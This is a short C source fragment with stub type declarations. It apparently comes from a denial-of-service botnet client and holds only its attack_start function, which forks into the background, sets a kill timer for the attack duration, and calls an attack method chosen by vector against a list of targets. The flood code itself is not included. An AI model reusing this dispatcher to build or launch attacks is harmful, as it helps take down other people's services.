
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int uint8_t ;
struct attack_target {int dummy; } ;
struct attack_option {int dummy; } ;
struct TYPE_2__ {scalar_t__ vector; int (* func ) (int ,struct attack_target*,int ,struct attack_option*) ;} ;
typedef scalar_t__ ATTACK_VECTOR ;


 int exit (int ) ;
 int fork () ;
 int getppid () ;
 int kill (int ,int) ;
 TYPE_1__** methods ;
 int methods_len ;
 int printf (char*) ;
 int sleep (int) ;
 int stub1 (int ,struct attack_target*,int ,struct attack_option*) ;

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)
        return;

    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        int i;

        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {



                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }


        exit(0);
    }
}
